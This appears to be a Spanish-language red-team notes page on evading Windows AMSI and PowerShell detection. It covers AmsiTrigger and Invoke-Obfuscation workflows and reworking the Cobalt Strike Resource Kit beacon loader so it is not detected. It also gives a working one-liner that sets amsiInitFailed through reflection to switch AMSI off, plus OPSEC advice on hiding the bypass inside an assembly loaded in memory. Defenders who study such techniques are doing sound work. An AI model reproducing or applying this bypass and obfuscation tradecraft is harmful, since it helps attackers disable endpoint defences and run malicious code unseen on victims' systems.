---
tags: [opsec, evasion, amsi, powershell, resource-kit]
status: done
platform: windows
---

# Script Artifact — AMSI & PowerShell Evasion

> Evadir detección de scripts PowerShell mediante bypass de AMSI y ofuscación.

---

## AMSI — Cómo Funciona

AMSI (Antimalware Scan Interface) intercepta la ejecución de scripts:
1. PowerShell pasa el script a `amsi.dll` antes de ejecutarlo
2. `amsi.dll` lo envía al AV/EDR registrado
3. Si el AV lo detecta → bloquea la ejecución

**Punto de interceptación:** La función `AmsiScanBuffer` en `amsi.dll`.

---

## AmsiTrigger — Identificar qué dispara AMSI

```powershell
# Escanear script contra AMSI
AmsiTrigger.exe -i script.ps1
AmsiTrigger.exe -i script.ps1 -f 3    # Formato detallado
# Output: fragmento exacto que dispara AMSI
```

---

## Resource Kit — Modificar scripts de CS

El Resource Kit de CS contiene los scripts PowerShell que usa Cobalt Strike internamente (para powerpick, execute-assembly, etc.):

```bash
# Contenido relevante del Resource Kit:
template.x64.ps1      # PowerShell loader del beacon
compress.ps1          # Script de compresión

# Proceso:
1. ThreatCheck / AmsiTrigger sobre template.x64.ps1
2. Identificar fragmento detectado
3. Ofuscar ese fragmento
4. Recargar Resource Kit en CS
```

---

## Invoke-Obfuscation — Ofuscación de Scripts

```powershell
# Cargar Invoke-Obfuscation
Import-Module Invoke-Obfuscation.ps1
Invoke-Obfuscation

# En el menú interactivo:
SET SCRIPTPATH C:\scripts\payload.ps1
TOKEN          # Ofuscación a nivel de token (AST)
ALL            # Aplicar todas las técnicas de token
OUT C:\output\obfuscated.ps1
```

**Tipos de ofuscación TOKEN:**
- `STRING` — ofusca strings literales
- `COMMAND` — ofusca nombres de comandos
- `ARGUMENT` — ofusca argumentos
- `MEMBER` — ofusca accesos a miembros de objetos
- `WHITESPACE` — ofusca espaciado

---

## Bypass AMSI Manual (one-liners conocidos)

> ⚠️ Estos one-liners se vuelven obsoletos rápidamente. Preferir técnicas propias.

```powershell
# Patch AmsiScanBuffer en memoria (clásico - muy detectado)
# [NO DOCUMENTAR — usar técnicas propias por entorno]

# Forzar error en AMSI (context corruption)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## OPSEC

> Los bypasses de AMSI genéricos (los que están en internet) están firmados por los EDRs.
> La mejor estrategia es combinar: script legítimo que carga un assembly en memoria que hace el bypass, en lugar de hacer el bypass directamente en PowerShell visible.

